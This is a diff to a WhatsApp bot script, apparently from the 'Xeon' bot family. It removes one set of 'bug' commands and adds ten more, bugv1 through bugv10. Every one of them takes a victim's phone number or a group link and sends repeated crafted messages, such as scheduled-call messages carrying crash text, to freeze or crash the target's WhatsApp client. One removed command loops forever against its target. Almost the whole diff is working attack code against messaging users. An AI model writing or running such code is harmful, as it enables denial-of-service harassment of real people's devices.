@@ -8810,236 +8810,214 @@ break
             break
             
 //bug cases
-case "xandroid": {
-  if (!isPremium) return replyprem(mess.premium);
-  if (!args[0])
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number")
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '')
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "6283833304947") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp")
-  }
-  replygcxeon("please wait, " + command + " bug is in process..")
-  await sleep(2000); // Adjusted sleep time for clarity
-  let xeontesx = await XeonBotInc.onWhatsApp(xeonnumx);
-  if (xeontesx.length == 0)
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  )
+case 'bugv1': {
+if (!isPremium) return replygcxeon(mess.premium)
+if (!args[0]) return relygcxeon(`Use ${prefix+command} amount\nExample ${prefix+command} 5`)
+amount = `${encodeURI(text)}`
+for (let i = 0; i < amount; i++) {
+const bugv1 = `${bugtext1}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv1,
 }
-break;
-case "xios": {
-  if (!XeonTheCreator) return
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number")
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '')
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "6283833304947") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp")
-  }
-  replygcxeon("please wait, " + command + " bug is in process..")
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendMultiplePaymentInvites(whatsappNumber, encodedAmount)
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  )
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(from, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
 }
-break;
-case "xios2":
-  {
-	if (!XeonTheCreator) return
-    if (!isBot) {
-      return replygcxeon("*This feature is for the bot only!*")
-    }
-    if (!text){
-      return replygcxeon(`Example usage: ${prefix + command} 5`)
-      }
-    if (isNaN(parseInt(text))) {
-      return replygcxeon("Amount must be a number")
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..")
-    await sleep(1500); // Adjusted sleep time for clarity
-    sendMultiplePaymentInvites(m.chat, encodedValue)
-    await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
-  }
-break;
-case "xandroid2":
-  {
-	if (!XeonTheCreator) return
-    if (!isBot) {
-      return replygcxeon("*This feature is for the bot only!*")
-    }
-    if (!text){
-      return replygcxeon(`Example usage: ${prefix + command} 5`)
-      }
-    if (isNaN(parseInt(text))) {
-      return replygcxeon("Amount must be a number")
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..")
-    await sleep(1500); // Adjusted sleep time for clarity
-    sendVariousMessages(m.chat, encodedValue)
-    await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅')
-  }
-break;
-case "xgc":
-  {
-    if (!XeonTheCreator) return
-    if (!text) {
-      return replygcxeon("*HOW TO SEND BUG TO GROUP*\n\n" + (prefix + command) + " https://chat.whatsapp.com/xxxx\n\n_*Note:*_ If you want to send a large number of bugs, please type as follows\n\nEx: ." + command + " linkgc amount\n\nExample:\n." + command + " https://chat.whatsapp.com/xxxx 10")
-    }
-    replygcxeon("please wait, " + command + " bug is in process..")
-    if (!text.split(" ")[0].includes("whatsapp.com")) {
-      return replygcxeon("Link Invalid!")
-    }
-    let groupLink = text.split(" ")[0].split("https://chat.whatsapp.com/")[1]
-    try {
-      let bugAmount = text.split(" ")[1] ? text.split(" ")[1] : '1';
-      let groupTarget = await XeonBotInc.groupAcceptInvite(groupLink)
-      await sleep(2000); // Adjusted sleep time for clarity
-      sendViewOnceMessages(groupTarget, bugAmount)
-      await sleep(2500); // Adjusted sleep time for clarity
-      replygcxeon("*DONE✅ BUG HAS BEEN SENT TO THE GROUP!.*")
-      XeonBotInc.groupLeave(groupTarget)
-    } catch (error) {
-      replygcxeon(util.format(error))
-    }
-  }
-break;
-case "🙂":
-  {
-	if (!XeonTheCreator) return
-    if (!isBot) {
-      return replygcxeon("*This feature is for the bot only!*")
-    }
-    if (!text){
-      return replygcxeon(`Example usage: ${prefix + command} 5`)
-      }
-    if (isNaN(parseInt(text))) {
-      return replygcxeon("Amount must be a number")
-    }
-    let encodedValue = encodeURI(text) * 200; // Adjusted calculation for clarity
-    replygcxeon("please wait, " + command + " bug is in process..")
-    await sleep(1500); // Adjusted sleep time for clarity
-    sendViewOnceMessages(m.chat, encodedValue)
-    await sleep(2500); // Adjusted sleep time for clarity
-    sendReaction('✅');
-  }
-  break;
-  case "systemuicrash": {
-  if (!XeonTheCreator) return
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net")
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "6283833304947") {
-    return;
-  }
-  if (contactInfo.length == 0) {
-    return replygcxeon("The number is not registered on WhatsApp")
-  }
-  replygcxeon("please wait, " + command + " bug is in process..")
-  await sleep(2000); // Adjusted sleep time for clarity
-  sendMixedMessages(whatsappNumber, encodedAmount);
-  await sleep(2500); // Adjusted sleep time for clarity
-  sendMessageWithMentions(
-    "Successfully Sent Bug To @" + whatsappNumber.split('@')[0] + 
-    " Using *" + command + "* ✅\n\nPause 2 minutes so that the bot is not banned.", 
-    [whatsappNumber]
-  )
 }
-  break;
-  case "xsysui": {
-  if (!XeonTheCreator) return
-  if (!text) return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  let number = text.split(',')[0];
-  let amount = text.split(',')[1] * 5;
-  if (!number || !amount) {
-    return replygcxeon(`Use ${prefix+command} victim number|amount\nExample ${prefix+command} 62xxxxxxxxxx,5`) 
-  }
-  if (isNaN(parseInt(amount))) {
-    return replygcxeon("Amount must be a number");
-  }
-  let cleanedNumber = number.replace(/[^0-9]/g, '');
-  let encodedAmount = '' + encodeURI(amount);
-  var contactInfo = await XeonBotInc.onWhatsApp(cleanedNumber + "@s.whatsapp.net");
-  let whatsappNumber = cleanedNumber + '@s.whatsapp.net';
-  if (cleanedNumber == "6283833304947") {
-    return;
-  }
+replygcxeon(`*Successfully sent as many bugs as ${amount} Please pause for 3 minutes*`)
+break
+case 'bugv2' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv2 = `${bugtext2}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv2,
 }
-break;
-case 'ioskill': case 'iosx': {
-            	if (!XeonTheCreator) return
-let xeonyvictim = q.replace(/[^0-9]/g, "")
-if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 6283833304947`)
-await replygcxeon(`In process....`)
-let target = xeonyvictim + '@s.whatsapp.net'
-  for (;;) {
-    await aipong(target)
-    await sleep(1200)
-  }
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
 }
-break;
-case 'onekill': case 'oneclickall': case 'xsamsung': case 'xwaweb': case 'doublekill': case '💀': case 'triplekill': {
-if (!XeonTheCreator) return
-if (!q) return replygcxeon(`Usage .${command} 6283833304947`)
-let xeonyvictim = q.replace(/[^0-9]/g, "")
-if (xeonyvictim.startsWith('0')) return replygcxeon(`Example : .${command} 6283833304947`)
-let target = xeonyvictim + '@s.whatsapp.net'
-await replygcxeon(`In process....`)
-for (let j = 0; j < 1; j++) {
-await locationxeony(target, force)
-await xeonkillpic(target, oneclickxeon)
-await locationxeony(target, force)
-await blackening(target, force2)
-await locationxeony(target, force)
 }
-await replygcxeon(`Successfully Send Bug to ${xeonyvictim} Using ${command}. ✅`)
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv3' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv3 = `${bugtext3}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv3,
 }
-break;
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv4' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv4 = `${bugtext4}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv4,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv5' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv5 = `${bugtext5}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv5,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv6' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv6 = `${bugtext6}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv6,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv7' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv7 = `${bugtext7}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv7,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv8' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv8 = `${bugtext8}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv8,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv9' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv9 = `${bugtextv9}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv9,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
+case 'bugv10' :{
+ if (!isPremium) return replygcxeon(mess.premium)
+ if (!args[0]) return replygcxeon(`Use ${prefix+command} number\nExample ${prefix+command} 916909137213`)
+ await loading()
+victim = text.split("|")[0]+'@s.whatsapp.net'
+amount = "30"
+for (let i = 0; i < amount; i++) {
+const bugv10 = `${bugtext10}`
+var scheduledCallCreationMessage = generateWAMessageFromContent(from, proto.Message.fromObject({
+"scheduledCallCreationMessage": {
+"callType": "2",
+"scheduledTimestampMs": `${moment(1000).tz("Asia/Kolkata").format("DD/MM/YYYY HH:mm:ss")}`,
+"title": bugv10,
+}
+}), { userJid: from, quoted : m})
+XeonBotInc.relayMessage(victim, scheduledCallCreationMessage.message, { messageId: scheduledCallCreationMessage.key.id })
+await sleep(3000)
+}
+}
+replygcxeon(`*Successfully sent Bug To ${victim} Please pause for 3 minutes*`)
+break
 
                 default:
                 if (budy.startsWith('=>')) {
